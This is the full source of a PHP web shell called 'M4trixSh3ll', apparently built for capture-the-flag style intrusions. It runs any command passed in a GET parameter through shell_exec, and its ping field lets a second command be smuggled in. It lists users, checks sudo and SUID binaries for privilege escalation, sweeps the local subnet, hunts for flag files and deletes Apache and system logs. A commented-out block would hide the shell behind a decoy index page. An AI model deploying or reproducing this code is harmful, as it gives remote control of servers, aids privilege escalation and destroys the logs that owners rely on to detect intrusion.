<head>
    <title>M4trixSh3ll</title>
    <style>
        html,
        body {
            background-color: black;
            color: green;
            font-family: monospace;
        }
        body p {
            color: white;
        }
    </style>
</head>

<?php

    $basefile = "x_";
    $write_path = "";

    function w_err($err)
    {
        $erz = `<p style="color:red;">$err</p>`;
        echo $erz;
    }

    function check_port($ip, $port)
    {
        try 
        {
            $fp = @fsockopen($ip, $port, $errno, $errstr, 0.1);
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in check_port()");
        }

        if (!$fp) 
        {
            return FALSE;
        } else 
        {
            fclose($fp);
            return TRUE;
        }
    }

    function get_ip_config()
    {
        $interfaces = array();
        try 
        {
            #$content = shell_exec("ifconfig > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "ifconfig.txt");
            
            $tmp = shell_exec("ip a");

            $tmp = explode("\n", $tmp);

            foreach ($tmp as $line) 
            {
                if (str_contains($line, "UP")) 
                {
                    array_push($interfaces, explode(":", $line)[1]);
                }
            }

            $ips = array();
            $macs = array();
            $netmasks = array();

            foreach ($interfaces as $interface) 
            {
                $tmp = shell_exec("ip a show $interface");
                $tmp = explode("\n", $tmp);
                foreach ($tmp as $line) 
                {
                    if (str_contains($line, "inet")) 
                    {
                        array_push($ips, explode(" ", $line)[5]);
                        array_push($netmasks, explode(" ", $line)[7]);
                    }
                    if (str_contains($line, "link/ether")) 
                    {
                        array_push($macs, explode(" ", $line)[5]);
                    }
                }
            }

            $res = "";
            for ($i = 0; $i < count($ips); $i++) 
            {
                $res .= "Interface : " . $interfaces[$i] . "\n";
                $res .= "IP : " . $ips[$i] . "\n";
                $res .= "Netmask : " . $netmasks[$i] . "\n";
                $res .= "MAC : " . $macs[$i] . "\n";
                $res .= "\n";
            }
            file_put_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "ifconfig.txt", $res);
            return $res;
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in get_ip_config() : " . $th);
        }
    }

    function send_icmp($ip)
    {
        try 
        {
            $f = shell_exec("ping -c 1 -W 2 $ip 2>/dev/null");
            sleep(1);
            if (str_contains($f, "1 received")) 
            {
                return TRUE;
            } else 
            {
                return FALSE;
            }
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in send_icmp() : " . $th);
        }
    }

    function get_net_machines($base_ip) // b_ip : x.x.x
    {
        $machines = array();
        for ($i = 1; $i < 255; $i++) 
        {
            $ip = $base_ip . $i;
            $res = send_icmp($ip);
            if ($res == TRUE) 
            {
                array_push($machines, $ip);
            }
            sleep(1);
        }
        return $machines;
    }

    function get_sys_info()
    {
        try 
        {
            $tmp = shell_exec("uname -a > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "sysinfo.txt");
            return $tmp;
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in get_sys_info()");
        }
    }

    function delete_tmp_files()
    {
        try 
        {
            shell_exec("rm " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "*");
            return TRUE;
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in delete_tmp_files()");
        }
    }

    function remove_logs()
    {
        try 
        {
            shell_exec("rm -f /var/log/apache2/*");
            shell_exec("rm -f /var/log/*.log");
            return TRUE;
        } 
        catch (\Throwable $th) 
        {
            w_err("Error in remove_logs()");
        }
    }

    function remove_all()
    {
        remove_logs();
        delete_tmp_files();
        return TRUE;
    }

    function check_esc_priv()
    {
        $esc_possible = array();
        $suid_files = array();

        function sudo_no_pass($esc_possible)
        {
            try 
            {
                $file = shell_exec("sudo -l -S test > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "sudo.txt");
                $file = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "sudo.txt");
                if (strlen($file) == 0) 
                {
                    array_push($esc_possible, "sudo_pass (You need the user's password)");
                }
                else if (str_contains($file, "not allowed to run sudo")) 
                {
                    return;
                } else if (str_contains($file, "NOPASSWD")) 
                {
                    array_push($esc_possible, "sudo_no_pass");
                } else if (str_contains($file, "password")) {
                    array_push($esc_possible, "sudo_pass (You need the user's password)");
                } else {
                    array_push($esc_possible, "sudo_pass (You need the user's password)");
                }
            }
            catch (\Throwable $th) 
            {
                return "Error in sudo_no_pass() : " . $th;
            }
            return $esc_possible;
        }

        function check_suid($esc_possible){
            try 
            {
                exec("find / -perm -u=s -type f 2>/dev/null > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "suid.txt");
                $file = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "suid.txt");

                if (strlen($file) > 0) 
                {
                    array_push($esc_possible, "suid (to check which files, do : ls " . $GLOBALS['write_path'] . $GLOBALS['basefile'] . "suid.txt)");
                }

                return $esc_possible;

            }
            catch (\Throwable $th) {
                return "Error in check_suid() : " . $th;
            }
        }

        $esc_possible = sudo_no_pass($esc_possible);

        $esc_possible = check_suid($esc_possible);

        exec("echo '" . implode(', ', $esc_possible) . "' > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "esc_possible.txt");
        return $esc_possible;
    }

    function get_users()
    {
        try
        {
            $file = shell_exec("cat /etc/passwd");
            $usrnames = array();
            $users = explode("\n", $file);
            foreach ($users as $user) 
            {
                array_push($usrnames, explode(":", $user)[0]);
            }
            exec("echo '" . implode(',', $usrnames) . "' > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "users.txt");
            return $usrnames;
        } 
        catch (\Throwable $th) {
            w_err("Error in get_users() " . $th);
            return "Error in get_users() " . $th;
        }
    }

    function get_usersflag()
    {
        exec("find /home -name user.txt 2>/dev/null > " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "usersflag.txt");
        $tmp = shell_exec("find /home -name user.txt 2>/dev/null");
        return $tmp;
    }

    function whoami()
    {
        try 
        {
            $tmp = shell_exec("whoami");
            return $tmp;
        } 
        catch (\Throwable $th) {
            w_err("Error in whoami()");
            return "Error in whoami()";
        }
    }

    $actual_user = whoami();

    echo '<h2>M4trixSh3ll has actually <span style="color:red">' . $actual_user . '</span> rights.</h2>';

    echo '<h2>Welcome Neo,<br/>Escaping the matrix...</h2>';
    $bkp = FALSE;
    try {
        $esc_possible = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "esc_possible.txt");
        $users = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "users.txt");
        $sys_info = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "sysinfo.txt");
        $ip_config = file_get_contents($GLOBALS["write_path"] . $GLOBALS['basefile'] . "ifconfig.txt");
        if ($esc_possible != FALSE && $users != FALSE && $sys_info != FALSE && $ip_config != FALSE) {
            $bkp = TRUE;
        }
    } catch (\Throwable $th) {
        w_err("[No backup files found]");
    }
    if ($bkp == FALSE){
        try {
            $esc_possible = check_esc_priv();
            $users = get_users();
            $sys_info = get_sys_info();
            $ip_config = get_ip_config();
        } catch (\Throwable $th) {
            w_err("Error in check_esc_priv() or get_users() or get_sys_info() or get_ip_config() : " . $th);
        }
    }
    if (gettype($esc_possible) == "array") 
    {
        $esc_possible = implode(", ", $esc_possible);
    }
    if (gettype($users) == "array") 
    {
        $users = implode(", ", $users);
    }
    //$machines = get_net_machines($base_ip);

    // BACKUP CREATION
    // try {
    //     shell_exec("mkdir " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "backup");
    //     shell_exec("mv " . $GLOBALS["write_path"] ."*.php " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "backup; mv " . $GLOBALS["write_path"] . $GLOBALS['basefile'] . "backup/shell.php " . $GLOBALS["write_path"] . "shell.php");
    //     shell_exec("touch " . $GLOBALS["write_path"] . "index.html");
    //     shell_exec("echo '<html><head><title>It works!</title></head><body><h1>It works!</h1></body></html>' > /var/www/html/index.html");
    // } catch (\Throwable $th) {
    //     w_err("Error in moving html data in a backup file & creating index.html");
    // }

    if (isset($_GET["ip"])) { 
        if (send_icmp($_GET["ip"])) { 
            $res_ping = "<p style='color:green;'>Host is up</p>"; 
        } else { 
            $res_ping = "<p style='color:red!important;'>Host is down</p>"; 
        } 
    }
    if (isset($_GET["cmd"])) { 
        $res_cmd = shell_exec($_GET["cmd"]); 
    }

?>

        <h1>M4trixSh3ll</h1>

        <h2>Input command : </h2>
        <form action="shell.php" method="GET">
            <input type="text" name="cmd" placeholder="Command">
            <input type="submit" value="Execute">
        </form>
        <p><?php echo $res_cmd; ?></p>

        <h2>To ping someone : </h2>
        <form action="shell.php" method="GET">
            <input type="text" name="ip" placeholder="IP">
            <input type="submit" value="Ping">
        </form>

        <?php if (isset($_GET["ip"])) { ?>
            <p><?php echo $res_ping; ?></p>
        <?php } ?>

        <h2>Escalation possible : </h2>
        <p><?php echo $esc_possible; ?></p>

        <h2>Users : </h2>
        <p><?php echo $users; ?></p>

        <h2>System info : </h2>
        <p><?php echo $sys_info; ?></p>

        <h2>IP config : </h2>
        <p><?php echo implode("<br/>", explode("\n", $ip_config)); ?></p>
    
    </body>

</html>
